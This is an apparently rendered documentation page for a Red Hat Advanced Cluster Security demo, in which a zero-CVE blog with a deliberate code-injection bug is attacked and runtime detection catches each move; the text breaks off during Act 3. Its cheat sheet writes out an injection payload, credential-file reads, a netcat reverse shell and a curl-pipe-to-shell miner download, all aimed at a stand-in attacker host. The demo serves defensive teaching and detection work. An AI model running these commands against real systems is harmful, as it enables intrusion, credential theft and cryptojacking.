+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_7" id="__nav_4_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module 7 - Incident Response & Forensics
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Module 7 - Incident Response & Forensics
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../auditing/audit-log-Investigation/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Mastering Audit Logs & Forensics
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../auditing/kubectl-timemachine-instructions/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kubectl Timemachine
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_8" id="__nav_4_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Module 8 - Sovereign
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Module 8 - Sovereign
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../sovereign/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Sovereign Cloud Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#rhacs-threat-detection-response-zero-cves-still-breached-caught-in-seconds" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RHACS Threat Detection &amp; Response — zero CVEs, still breached, caught in seconds
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#contents" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Contents
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-story-in-one-minute" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The story in one minute
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#quick-start-with-make" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Quick start with make
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#live-mode-make-live-recommended-on-stage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Live mode — make live (recommended on stage)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#setup-once" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Setup (once)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#before-you-go-on-stage" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Before you go on stage
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#delivering-the-demo-act-by-act" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Delivering the demo, act by act
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Delivering the demo, act by act">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#act-1-unhackable-3-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Act 1 — "Unhackable" (3 min)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#act-2-day-zero-4-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Act 2 — "Day zero" (4 min)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#act-3-living-off-the-land-loot-4-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Act 3 — "Living off the land: loot" (4 min)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#act-4-persistence-and-profit-4-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Act 4 — "Persistence and profit" (4 min)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#act-5-respond-shrink-the-blast-radius-then-close-the-door-4-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Act 5 — "Respond: shrink the blast radius, then close the door" (4 min)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#act-6-fix-forward-3-min" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Act 6 — "Fix forward" (3 min)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#reset-between-runs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reset between runs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-attacker-lives-outside-the-cluster" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The attacker lives outside the cluster
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#roxctl-and-the-rox-helpers" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        roxctl and the rox-* helpers
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rhacs-50-features-used" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RHACS 5.0 features used
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#whats-in-the-box" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        What's in the box
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="What&#39;s in the box">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#the-policies" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        The policies
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#questions-you-will-get" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Questions you will get
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Troubleshooting
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="the-unhackable-blog">The Unhackable Blog</h1>
+<h3 id="rhacs-threat-detection-response-zero-cves-still-breached-caught-in-seconds">RHACS Threat Detection &amp; Response — zero CVEs, still breached, caught in seconds</h3>
+<blockquote>
+<p><em>"0 CVEs is where security starts, not where it ends."</em></p>
+</blockquote>
+<p>📸 <strong><a href="docs/WALKTHROUGH/">Step-by-step walkthrough with screenshots of a real run →</a></strong>
+🎤 <strong><a href="docs/TALK/">The 40-minute talk: run of show →</a></strong> · <strong><a href="docs/SCRIPT/">word for word →</a></strong></p>
+<p>A self-contained demo for <strong>Red Hat Advanced Cluster Security 5.0</strong> on <strong>OpenShift Local (CRC)</strong>.
+A blog with <strong>zero CVEs and the lowest risk score in the cluster</strong> gets breached through a bug
+in its own code. Every attacker move — recon, credential hunting, lateral movement, reverse shell,
+crypto miner — lights up in RHACS within seconds. Then RHACS <strong>kills the pod</strong> and a
+<strong>NetworkPolicy</strong> contains the blast radius. No AI, no LLMs: just a classic web bug and the
+runtime controls that catch it.</p>
+<hr />
+<h2 id="contents">Contents</h2>
+<ul>
+<li><a href="#the-story-in-one-minute">The story in one minute</a></li>
+<li><a href="#quick-start-with-make">Quick start with make</a></li>
+<li><a href="#live-mode--make-live-recommended-on-stage">Live mode — make live</a></li>
+<li><a href="#setup-once">Setup (once)</a></li>
+<li><a href="#before-you-go-on-stage">Before you go on stage</a></li>
+<li><a href="#delivering-the-demo-act-by-act">Delivering the demo, act by act</a></li>
+<li><a href="#reset-between-runs">Reset between runs</a></li>
+<li><a href="#the-attacker-lives-outside-the-cluster">The attacker lives outside the cluster</a></li>
+<li><a href="#roxctl-and-the-rox--helpers">roxctl and the rox-* helpers</a></li>
+<li><a href="#rhacs-50-features-used">RHACS 5.0 features used</a></li>
+<li><a href="#whats-in-the-box">What's in the box</a></li>
+<li><a href="#questions-you-will-get">Questions you will get</a></li>
+<li><a href="#troubleshooting">Troubleshooting</a></li>
+</ul>
+<hr />
+<h2 id="the-story-in-one-minute">The story in one minute</h2>
+<table>
+<thead>
+<tr>
+<th>Act</th>
+<th>Title</th>
+<th>What happens</th>
+<th>What RHACS shows</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>Unhackable</strong></td>
+<td>Marketing calls the blog unhackable. RHACS agrees: 0 CVEs, hardened, no violations.</td>
+<td>Vulnerability management: <strong>0 CVEs</strong>. Risk: lowest. Violations: none.</td>
+</tr>
+<tr>
+<td>2</td>
+<td><strong>Day zero</strong></td>
+<td><em>Check links</em> lets writers attach a Go <em>rule</em>, run by an embedded interpreter (yaegi) that was handed <code>exec.Command</code>. A rule is code — so it runs host commands. Code injection (CWE-94).</td>
+<td><em>Unauthorized process</em> (<code>id</code>, <code>uname</code>, <code>cat</code>) — the baseline is a single binary.</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>Loot</strong></td>
+<td>No SA token, no secrets in env… but AWS keys in <code>~/.aws/credentials</code> and secrets in the app's <code>.env</code>. They're <strong>honeytokens</strong>. Then the blog reads card data from <code>payments-api</code>.</td>
+<td><em>Honeytoken touched</em>. <em>Unexpected network flow to payments-api</em> (its baseline is empty and locked). Network graph: anomalous blog → payments, blog → kube API.</td>
+</tr>
+<tr>
+<td>4</td>
+<td><strong>Persistence &amp; profit</strong></td>
+<td>Reverse shell to <code>attacker.example.local:4444</code>. Crypto miner downloaded into <code>/tmp</code>, made executable, started.</td>
+<td><em>Reverse shell tool executed</em>, <em>Crypto miner</em>, <em>Container drift: file dropped or made executable</em>, flows to the external entity <strong>attacker.example.local</strong>.</td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>Respond</strong></td>
+<td><strong>Kill</strong> first: enforcement on, the attacker's next command kills the pod — blast radius cut, time bought. <strong>Then</strong> a NetworkPolicy closes the door.</td>
+<td>Violation with <em>Enforced: kill pod</em>. New clean pod. Egress blocked.</td>
+</tr>
+<tr>
+<td>6</td>
+<td><strong>Fix forward</strong></td>
+<td>Ship v2: rule engine removed, URL parsed, native HTTP client. Still 0 CVEs. Exploit is dead.</td>
+<td>Clean v2 image, no new violations.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The one-line takeaway:</strong> vulnerability scanning tells you what <em>could</em> go wrong in the code you
+<em>imported</em>; runtime detection tells you what <em>is</em> going wrong in the code you <em>wrote</em> — and stops it.</p>
+<hr />
+<h2 id="quick-start-with-make">Quick start with <code>make</code></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>make<span class="w"> </span>install<span class="w">     </span><span class="c1"># first time only: CRC + RHACS + demo (~45-60 min)</span>
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>make<span class="w"> </span>up<span class="w">          </span><span class="c1"># every session: starts EVERYTHING (CRC, RHACS, demo, attacker), installs what's</span>
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">                 </span><span class="c1"># missing, resets, then verifies end to end — when it says "armed", you can show</span>
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>make<span class="w"> </span>verify<span class="w">      </span><span class="c1"># re-run just the end-to-end checks</span>
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>make<span class="w"> </span>status<span class="w">      </span><span class="c1"># where are we? CRC, RHACS, Scanner V4 DB, blog, enforcement, violations, attacker</span>
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>make<span class="w"> </span>password<span class="w">    </span><span class="c1"># RHACS console URL, user and password</span>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>make<span class="w"> </span>live<span class="w">        </span><span class="c1"># the show: tmux with attacker curl | C2 nc | RHACS alerts | pods</span>
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>make<span class="w"> </span>act1<span class="w"> </span>…<span class="w"> </span>act6<span class="w"> </span><span class="c1"># or the scripted acts (run `make c2` in a second terminal before act4)</span>
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>make<span class="w"> </span>reset<span class="w">       </span><span class="c1"># between runs</span>
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>make<span class="w"> </span>down<span class="w">        </span><span class="c1"># stop everything (live views, attacker, CRC) — deletes nothing, frees the RAM</span>
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>make<span class="w"> </span>recreate<span class="w">    </span><span class="c1"># cluster broken beyond a restart? delete it and rebuild everything (asks first)</span>
+</code></pre></div>
+<p><code>make</code> on its own lists every target. The sections below explain what each step does.</p>
+<hr />
+<h2 id="live-mode-make-live-recommended-on-stage">Live mode — <code>make live</code> (recommended on stage)</h2>
+<p>One tmux window, five panes. <strong>You type one short command per attacker move; everything else reacts
+on its own.</strong> The pane shows the request and a clean, readable result — no shell noise — so a CISO or
+architect in the room can follow every step and watch RHACS catch it. Each pane has its own subtle
+tint so a busy screen stays readable — the two <strong>warm</strong> panes on the left are the <strong>attacker (your
+laptop)</strong>; the three <strong>cool</strong> panes on the right are the <strong>live cluster</strong>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>┌──────────────────────────────────┬──────────────────────────────────┐
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>│ 1  ATTACKER — you type pwn '…'   │ 3  RHACS — live threat timeline  │
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>│    (cheat sheet printed here)    │    severity · MITRE · what ran   │
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>│                                  ├──────────────────────────────────┤
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>├──────────────────────────────────┤ 4  BLOG — app logs (oc logs -l)  │
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>│ 2  C2 — nc on attacker.example   │    every attack = a "link check" │
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>│    .local:4444 (shell lands here)├──────────────────────────────────┤
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>│                                  │ 5  PODS — the kill + restart     │
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>└──────────────────────────────────┴──────────────────────────────────┘
+</code></pre></div>
+<p>The <strong>BLOG</strong> pane is the "fix <em>what</em>?" answer: the app's own logs show only innocent <code>link check</code>
+lines — the attack is invisible at the application layer, which is exactly why runtime detection
+earns its place. Act 6 fixes that one endpoint.</p>
+<p>Each move is one line. <code>link</code> uses the feature normally; <code>pwn</code> runs a command through the injection.
+Both make the exact same HTTP POST a browser would — they just print the request and result cleanly:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pwn<span class="w"> </span><span class="s1">'id'</span><span class="w">     </span><span class="c1"># = curl -sk $BLOG/api/links/check --data-urlencode "url=';id #", de-noised</span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Type in pane 1</th>
+<th>Watch</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>the feature</td>
+<td><code>link https://www.redhat.com/en</code></td>
+<td><code>alive: …</code> — normal use, no alert</td>
+</tr>
+<tr>
+<td>1 · the bug</td>
+<td><code>pwn 'id'</code></td>
+<td>pane 3: <em>Unauthorized process</em></td>
+</tr>
+<tr>
+<td>2 · credentials</td>
+<td><code>pwn 'cat ~/.aws/credentials'</code>, <code>pwn 'cat /opt/blog/.env'</code></td>
+<td>pane 3: <em>Honeytoken touched</em></td>
+</tr>
+<tr>
+<td>3 · lateral</td>
+<td><code>pwn 'curl -s http://payments-api.payments.svc:8080/api/v1/cards'</code></td>
+<td>pane 3: <em>Unexpected network flow to payments-api</em></td>
+</tr>
+<tr>
+<td>4 · reverse shell</td>
+<td><code>pwn 'nc attacker.example.local 4444 -e /bin/sh &gt;/dev/null 2&gt;&amp;1 &amp;'</code></td>
+<td>pane 2: <code>connect to …</code> then a live shell — type <code>id</code>, <code>ps</code> there</td>
+</tr>
+<tr>
+<td>5 · miner</td>
+<td><code>pwn 'curl -s http://attacker.example.local:8080/stage.sh \| sh'</code></td>
+<td>pane 3: <em>Crypto miner</em>, <em>Container drift</em></td>
+</tr>
+<tr>
+<td>respond 1</td>
+<td><code>make enforce</code>, then repeat step 1</td>
+<td>pane 4: pod killed and replaced · pane 3: <em>POD KILLED</em> · pane 2: shell dies, listener restarts</td>
+</tr>
+<tr>
+<td>respond 2</td>
+<td><code>make contain</code>, then repeat step 4</td>
+<td>nothing reaches pane 2 — egress blocked</td>
+</tr>
+<tr>
+<td>fix</td>
+<td><code>make fix</code>, then repeat step 1</td>
+<td><code>not a valid http(s) URL</code></td>
+</tr>
+<tr>
+<td>again</td>
+<td><code>make reset</code></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>The full list is printed in pane 1 when the session opens (<code>scripts/live.sh --cheatsheet</code>). The reverse
+shell is raw — no prompt — so pane 2 stays quiet until <code>connect to … from …</code> appears; then type <code>id</code>
+blindly. Click a pane to type in it; <code>Ctrl-b d</code> detaches, <code>tmux kill-session -t tdr</code> closes it.</p>
+<blockquote>
+<p>After changing <code>app/blog</code>, run <code>make images</code> to rebuild, push and rescan (the cluster must be up).</p>
+</blockquote>
+<hr />
+<h2 id="setup-once">Setup (once)</h2>
+<p>Requirements: Fedora/RHEL laptop with KVM, <strong>≥ 30 GB RAM, 8+ cores, 120 GB free disk</strong>, <code>oc</code>, <code>roxctl</code>,
+<code>podman</code>, <code>jq</code>, a Red Hat <strong>pull secret</strong> at <code>~/pull-secret.txt</code>
+(<a href="https://console.redhat.com/openshift/create/local">download</a>) and the CRC tarball in <code>~/Downloads</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">cd</span><span class="w"> </span>use_cases/threat-detection-response
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>scripts/00-crc-up.sh<span class="w">        </span><span class="c1"># ~25 min first time: libvirt, crc setup, crc start (8 vCPU / 20 GiB / 100 GiB)</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>scripts/01-rhacs-install.sh<span class="w"> </span><span class="c1"># ~15 min: operator → Central → CRS → SecuredCluster "production" → API token</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>scripts/02-demo-setup.sh<span class="w">    </span><span class="c1"># ~5 min: build+push images, deploy, policies, learn + LOCK baselines, start the attacker</span>
+</code></pre></div>
+<p>All three are idempotent — re-run any of them safely. They ask for root once (fingerprint works).</p>
+<p><strong>Sizing &amp; networking.</strong> CRC defaults (4 vCPU / 10.75 GiB / 31 GiB) can't carry RHACS. The script sets
+<strong>8 vCPU, 20 GiB RAM, 100 GiB disk</strong> (sparse — only used space costs), and turns cluster monitoring off
+(saves ~4 GiB). Networking is <code>system</code> mode (libvirt bridge <code>192.168.130.0/24</code>, DNS for
+<code>*.apps-crc.testing</code> via the NetworkManager dispatcher that <code>crc setup</code> installs). <strong>Host network access
+stays off</strong>: the attacker infrastructure lives <em>inside</em> the cluster, so the VM never needs to reach the
+laptop and the laptop firewall can keep dropping all inbound traffic.</p>
+<table>
+<thead>
+<tr>
+<th>Script</th>
+<th>What it does</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>00-crc-up.sh</code></td>
+<td>Installs <code>crc</code> from the tarball, installs libvirt/KVM, joins the <code>libvirt</code> group (no re-login), configures CRC sized for RHACS, <code>crc setup</code>, <code>crc start</code>, logs in, exposes the image registry. Tunables: <code>CRC_CPUS</code>, <code>CRC_MEMORY</code>, <code>CRC_DISK</code>, <code>PULL_SECRET</code>.</td>
+</tr>
+<tr>
+<td><code>01-rhacs-install.sh</code></td>
+<td>RHACS 5.0 operator (stable channel), Central tuned for one node (Scanner V4 only), a <strong>Cluster Registration Secret</strong> generated with <code>roxctl central crs generate</code>, SecuredCluster <code>production</code> with eBPF collector and file activity monitoring, and an API token in <code>.state/rhacs.env</code> (mode 600, git-ignored). The admin password is <strong>never printed</strong>: <code>--password</code> copies it to the clipboard.</td>
+</tr>
+<tr>
+<td><code>02-demo-setup.sh</code></td>
+<td>Builds blog v1/v2 (pushed to the CRC registry) and the attacker kit (local only), connects RHACS to the registry, deploys the blog and payments-api fresh, loads the policies as code, enables <em>Unauthorized Network Flow</em>, generates normal traffic, <strong>pins and locks the process and network baselines</strong>, tries one image scan (never waits for Scanner V4 — its DB finishes loading by itself), then starts the attacker (<code>attacker.sh up</code>).</td>
+</tr>
+<tr>
+<td><code>attacker.sh</code></td>
+<td>The attacker's machine is <strong>this laptop</strong> — see <a href="#the-attacker-lives-outside-the-cluster">The attacker lives outside the cluster</a>. <code>up</code>, <code>c2</code>, <code>logs</code>, <code>status</code>, <code>down</code>.</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="before-you-go-on-stage">Before you go on stage</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>scripts/demo.sh<span class="w"> </span>reset<span class="w">      </span><span class="c1"># v1, enforcement off, NetworkPolicies removed, violations resolved</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>scripts/demo.sh<span class="w"> </span>status<span class="w">     </span><span class="c1"># sanity check: image v1, enforcement [], no netpols, no violations</span>
+</code></pre></div>
+<p>Lay out your screen:</p>
+<table>
+<thead>
+<tr>
+<th>Window</th>
+<th>What</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Terminal A</strong> (big font)</td>
+<td><code>scripts/demo.sh act1</code> … <code>act6</code></td>
+</tr>
+<tr>
+<td><strong>Terminal B</strong></td>
+<td><code>scripts/attacker.sh c2</code> — the attacker's reverse-shell listener on this laptop (start it during Act 4)</td>
+</tr>
+<tr>
+<td><strong>Browser tab 1</strong></td>
+<td>The blog: <code>https://blog-unhackable.apps-crc.testing</code> (open <code>/write</code>)</td>
+</tr>
+<tr>
+<td><strong>Browser tab 2</strong></td>
+<td>RHACS → <strong>Violations</strong>, filtered to namespace <code>unhackable</code></td>
+</tr>
+<tr>
+<td><strong>Browser tab 3</strong></td>
+<td>RHACS → <strong>Network Graph</strong>, namespaces <code>unhackable</code>, <code>payments</code>, <code>attacker</code></td>
+</tr>
+<tr>
+<td><strong>Browser tab 4</strong></td>
+<td>RHACS → <strong>Vulnerability Management</strong> → image <code>unhackable/blog:v1</code></td>
+</tr>
+</tbody>
+</table>
+<p>RHACS login: <code>rox-ui</code> prints URL, user and password (<code>rox-password</code> prints just the password and copies it).
+<code>demo.sh act1</code> prints all the links.</p>
+<p>Each act prints <strong>💬 what to say</strong> and <strong>👉 what to show</strong>. Acts pause at <code>[enter]</code> where you switch
+to the browser (<code>NO_PAUSE=1</code> disables pauses). Total runtime: <strong>20–25 minutes</strong>.</p>
+<hr />
+<h2 id="delivering-the-demo-act-by-act">Delivering the demo, act by act</h2>
+<h3 id="act-1-unhackable-3-min">Act 1 — "Unhackable" (3 min)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>scripts/demo.sh<span class="w"> </span>act1
+</code></pre></div>
+<p><strong>Open with the claim.</strong> Show the blog homepage: <em>"The blog that can't be hacked."</em> Then prove it with RHACS:</p>
+<ul>
+<li><strong>Vulnerability Management → Images → <code>unhackable/blog:v1</code></strong>: <strong>0 CVEs</strong>. Point out why: a static Go
+  binary with no third-party modules, latest Alpine with everything upgraded, <code>apk</code> removed. No KEV
+  matches either — nothing on CISA's exploited list because there's nothing on any list.</li>
+<li><strong>Risk → <code>blog</code></strong>: lowest in the cluster. Non-root, read-only root filesystem, all capabilities
+  dropped, no service account token, limits set.</li>
+<li><strong>Violations</strong>: none.</li>
+</ul>
+<blockquote>
+<p>💬 <em>"Every scanner is green. Every admission gate passes. If this were your app, you'd ship it.
+So — is it secure?"</em></p>
+</blockquote>
+<p>Let the question hang. That's the hook for the rest of the talk.</p>
+<h3 id="act-2-day-zero-4-min">Act 2 — "Day zero" (4 min)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>scripts/demo.sh<span class="w"> </span>act2
+</code></pre></div>
+<ol>
+<li>In the browser open <strong><code>/write</code></strong>, press <strong>Check links</strong> — it works, links are green. This feature
+   is real and useful.</li>
+<li>Explain the feature: <em>Check links</em> lets power users attach a short Go <em>rule</em> to validate a link. The
+   app evaluates it with an embedded Go interpreter (<strong>yaegi</strong>) — and handed that sandbox <code>exec.Command</code>.
+   Show <code>app/blog/linkcheck_v1.go</code>. yaegi scans clean (<strong>0 CVEs</strong>) — the bug is giving it a dangerous
+   capability and untrusted input.</li>
+<li>Press enter: the "rule" is Go that runs <code>id</code>. It comes back: <strong>remote code execution</strong> (CWE-94).</li>
+</ol>
+<blockquote>
+<p>💬 <em>"That's not a CVE. There's no package to upgrade, no advisory, no scanner signature. It's our
+code. This is the class of bug that zero-CVE images don't protect you from."</em></p>
+</blockquote>
+<p>Switch to <strong>Violations</strong>: <em>TDR – Unauthorized process in the Unhackable Blog</em> is already there —
+<code>id</code>, <code>uname</code>, <code>cat</code>, <code>head</code>. Open it and show the process details: exec path, arguments, parent,
+UID, container, time. Explain <strong>process baselines</strong>: RHACS learned that this container runs exactly
+a <strong>single binary</strong> (<code>blog</code>) — the app validates links natively and runs rules in-process, so it
+spawns no child process at all — and we <strong>locked</strong> that baseline. Any process is an alert.</p>
+<blockquote>
+<p>💡 Worth noticing: the attacker's own <code>sh</code> and <code>curl</code> are <em>in</em> the baseline (the feature uses them).
+RHACS still catches every other binary. That's why baselines beat signatures.</p>
+</blockquote>
+<h3 id="act-3-living-off-the-land-loot-4-min">Act 3 — "Living off the land: loot" (4 min)</h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>scripts/demo.sh<span class="w"> </span>act3
+</code></pre></div>
+<p>The attacker hunts for credentials and hits the hardening:</p>
+<ul>
+<li><strong>No service account token</strong> → nothing to steal for the Kubernetes API.</li>
+<li><strong>Nothing in the environment.</strong></li>
+<li><strong>But: <code>~/.aws/credentials</code> and <code>/opt/blog/.env</code>!</strong> The attacker reads AWS keys and app secrets.</li>
+</ul>
+<blockquote>
+<p>💬 <em>"Those keys are fake. We planted them. The app never touches that file — so the only thing that
+ever will is an attacker. It's a honeytoken, and RHACS just told us someone took the bait."</em></p>
+</blockquote>
+<p>Show <strong>TDR – Honeytoken touched</strong> in Violations.</p>
+<p>Then <strong>lateral movement</strong>: the blog probes the Kubernetes API and reads <strong>card data from
+<code>payments-api</code></strong>. Switch to the <strong>Network Graph</strong>: the blog → payments-api flow is drawn as
+<strong>anomalous</strong>, and <strong>TDR – Unexpected network flow to payments-api</strong> fires: payments-api's network
